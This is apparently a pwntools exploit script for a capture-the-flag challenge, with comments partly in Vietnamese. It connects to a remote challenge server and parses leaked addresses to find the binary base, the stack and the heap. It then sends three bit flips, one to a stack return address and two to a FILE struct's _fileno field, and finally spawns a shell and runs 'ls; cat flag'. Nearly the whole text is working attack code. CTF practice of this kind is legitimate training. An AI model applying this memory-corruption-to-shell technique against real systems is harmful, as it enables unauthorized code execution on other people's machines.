from pwn import *

exe = './main'
elf = ELF(exe, checksec=False)

r = remote('chall.0xfun.org', 56633)
# r = process(exe) 

# ================= LOGIC =================

def send_flip(address, bit_index, is_last_round):
    log.info(f"Flipping at {hex(address)} bit {bit_index}")
    r.sendline(hex(address).encode())
    r.sendline(str(bit_index).encode())
    
    if not is_last_round:
        r.recvuntil(b'> ')

# 1. Leak Info
r.recvuntil(b'&main = ')
leak_main = int(r.recvline().strip(), 16)
r.recvuntil(b'&system = ')
r.recvline() 
r.recvuntil(b'&address = ')
leak_stack = int(r.recvline().strip(), 16)
r.recvuntil(b'sbrk(NULL) = ')
leak_heap = int(r.recvline().strip(), 16)

log.info(f"Leak Main : {hex(leak_main)}")
log.info(f"Leak Stack: {hex(leak_stack)}")
log.info(f"Leak Heap : {hex(leak_heap)}")

# 2. Tính toán Address
elf.address = leak_main - 0x1405
log.success(f"PIE Base  : {hex(elf.address)}")

# --- Target 1: Stack (Nhảy về cmd + 1) ---
stack_ret_addr = leak_stack + 0x18
bits_stack = [3] 

# --- Target 2: _fileno trên Heap ---
# Offset chuẩn xác từ GDB của bạn
HEAP_OFFSET = 0x20d60

# Địa chỉ struct FILE = Heap_End - Offset
# Địa chỉ _fileno = Struct FILE + 0x70
fileno_addr = leak_heap - HEAP_OFFSET + 0x70

log.info(f"Target _fileno addr: {hex(fileno_addr)}")

# 3 -> 0 (Lật bit 0 và 1)
bits_heap = [0, 1]

# Tổng hợp
all_flips = []
# Flip Stack trước
all_flips.append((stack_ret_addr, 3))
# Flip Heap sau
all_flips.append((fileno_addr, 0))
all_flips.append((fileno_addr, 1))

# 3. Thực thi Attack
r.recvuntil(b'> ')

for i in range(3):
    addr, bit = all_flips[i]
    is_last = (i == 2)
    send_flip(addr, bit, is_last)

# 4. Gửi lệnh
log.success("Exploit sent! Spawning shell...")

# Gửi lệnh 'sh' vào stdin (vì lúc này _fileno đã trỏ về stdin)
# Gửi thêm ls; cat flag cho chắc
r.sendline(b'sh') 
r.sendline(b'ls; cat flag')

r.interactive()